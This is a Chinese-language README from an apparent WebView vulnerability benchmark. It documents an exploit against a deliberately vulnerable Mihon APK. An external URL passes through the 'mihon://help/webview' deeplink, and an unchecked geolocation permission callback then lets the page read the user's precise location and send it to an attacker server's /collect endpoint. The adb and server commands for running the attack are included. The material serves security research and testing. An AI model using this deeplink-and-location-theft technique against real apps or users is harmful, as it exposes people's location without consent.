# 3.1.3 Insecure Permission Request Callback EXP

## 漏洞触发点

Mihon 帮助页 deeplink `mihon://help/webview?url=<external_url>` 将外部 URL 交给 `WebViewActivity`。漏洞样本的 `onGeolocationPermissionsShowPrompt` 回调未校验页面来源，直接授予地理位置权限。

攻击页面使用 `navigator.geolocation.getCurrentPosition()` 获取用户精确位置，并通过 `/collect?d=<data>` 回传经纬度等定位数据。

## 前置条件

1. 连接 MuMu 模拟器：

```powershell
adb connect 127.0.0.1:7555
```

2. 安装漏洞 APK（`apk/mihon-0.19.9/vuln/3.1.3.apk`）：

```powershell
adb -s 127.0.0.1:7555 install apk\mihon-0.19.9\vuln\3.1.3.apk
```

## 运行服务端

```powershell
cd "d:\Secsys\Webview Benchmark&自动化挖掘\Phrase 6\WebviewBench\exp\mihon-0.19.9\3.1.3_Insecure_Permission_Request_Callback"
python .\server.py
```

服务端监听 `0.0.0.0:8000`，攻击页面路径：`http://10.0.2.2:8000/exp/3.1.3`

回收数据写入 `received/collected_<timestamp>.txt`。

## 触发 exploit

```powershell
adb -s 127.0.0.1:7555 shell am start -a android.intent.action.VIEW -d "mihon://help/webview?url=http%3A%2F%2F10.0.2.2%3A8000%2Fexp%2F3.1.3"
```

## 预期结果

WebView 加载攻击页面后自动请求地理位置权限。若应用无条件授予权限，`received/` 目录中出现文件，包含：
- `latitude`、`longitude`（经纬度）
- `altitude`（海拔）
- `accuracy`（精度）
- `speed`（速度）
